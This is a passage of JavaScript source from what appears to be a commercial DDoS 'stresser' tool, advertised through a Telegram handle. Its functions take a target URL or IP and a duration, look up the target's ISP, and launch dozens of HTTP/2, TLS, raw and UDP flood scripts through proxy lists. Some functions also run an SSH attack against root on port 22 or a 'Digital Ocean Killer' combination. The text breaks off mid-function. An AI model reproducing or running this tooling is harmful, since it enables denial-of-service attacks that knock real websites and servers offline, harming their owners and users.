⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[41m\x1b[41m!\x1b[0m 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑭𝑼𝑳𝑳𝒀 𝑺𝑬𝑵𝑻 𝑻𝑶 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 \x1b[41m\x1b[41m!\x1b[0m

\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36m𝑯2-𝑫𝑨𝑹𝑲\x1b[1;35m]
\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔\x1b[1;35m]
\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const h2blast = path.join(__dirname, `/lib/cache/h2blast.js`);
const h2bypass = path.join(__dirname, `/lib/cache/h2bypass.js`);
const h2flash = path.join(__dirname, `/lib/cache/h2flash.js`);
const h2flood = path.join(__dirname, `/lib/cache/h2flood.js`);
const h2hold = path.join(__dirname, `/lib/cache/h2hold.js`);
const h2storm = path.join(__dirname, `/lib/cache/h2storm.js`);
const h2website = path.join(__dirname, `/lib/cache/h2website.js`);
const httpdark = path.join(__dirname, `/lib/cache/httpdark.js`);
const h2dark = path.join(__dirname, `/lib/cache/h2dark.js`);
const h2fumi = path.join(__dirname, `/lib/cache/h2fumi.js`);
const h2meris = path.join(__dirname, `/lib/cache/h2meris.js`);
const h2mika = path.join(__dirname, `/lib/cache/h2mika.js`);
const httpgecko = path.join(__dirname, `/lib/cache/httpgecko.js`);
const xhttp = path.join(__dirname, `/lib/cache/xhttp.js`);
const ninja = path.join(__dirname, `/lib/cache/ninja.js`);
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const rawi = path.join(__dirname, `/lib/cache/rawi.js`);
const httpdarksadboy = path.join(__dirname, `/lib/cache/httpdarksadboy.js`);
const httpsocket = path.join(__dirname, `/lib/cache/httpsocket.js`);
        exec(`node ${h2blast} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2bypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2flash} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2flood} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2hold} ${target} ${duration} 80 10`)
        exec(`node ${h2storm} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2website} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${httpdark} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2dark} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2fumi} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2meris} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${h2mika} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${httpgecko} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${xhttp} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${ninja} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${raw} ${target} ${duration} 80 10`)
        exec(`node ${rawi} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${httpdarksadboy} ${target} 80 proxy.txt 10 ${duration}`)
        exec(`node ${httpsocket} ${target} 80 proxy.txt 10 ${duration}`)
sigma()
};
async function steven(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Steven <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Steven https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[41m\x1b[41m!\x1b[0m 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑭𝑼𝑳𝑳𝒀 𝑺𝑬𝑵𝑻 𝑻𝑶 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 \x1b[41m\x1b[41m!\x1b[0m

\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36m𝑺𝑻𝑬𝑽𝑬𝑵\x1b[1;35m]
\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔\x1b[1;35m]
\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tlsv1 = path.join(__dirname, `/lib/cache/tlsv1.js`);
const boti = path.join(__dirname, `/lib/cache/boti.js`);
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
const mix = path.join(__dirname, `/lib/cache/mix.js`);
const dsadnet = path.join(__dirname, `/lib/cache/dsadnet.js`);
const hand = path.join(__dirname, `/lib/cache/hand.js`);
const hold = path.join(__dirname, `/lib/cache/hold.js`);
const tlscti = path.join(__dirname, `/lib/cache/tlscti.js`);
const chaptcha = path.join(__dirname, `/lib/cache/chaptcha.js`);
        exec(`node ${tlsv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${boti} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${ciko} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${mix} ${target} ${duration} 80 10`)
        exec(`node ${dsadnet} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${hand} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${hold} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tlscti} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${chaptcha} ${target} ${duration} 80 10 proxy.txt`)   
sigma()
}; 
//========//
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Kill-Ssh <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Kill-Ssh 123.456.789.10 60 Flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑰𝑺𝑷      : ${result.isp}
𝑰𝑷       : ${result.query}
𝑨𝑺𝑵       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: kill-do <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑫𝒊𝒈𝒊𝒕𝒂𝒍 𝑶𝒄𝒆𝒂𝒏 𝑲𝒊𝒍𝒍𝒆𝒓
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Udp <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑷𝒐𝒓𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Udp 123.456.78.910 53 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
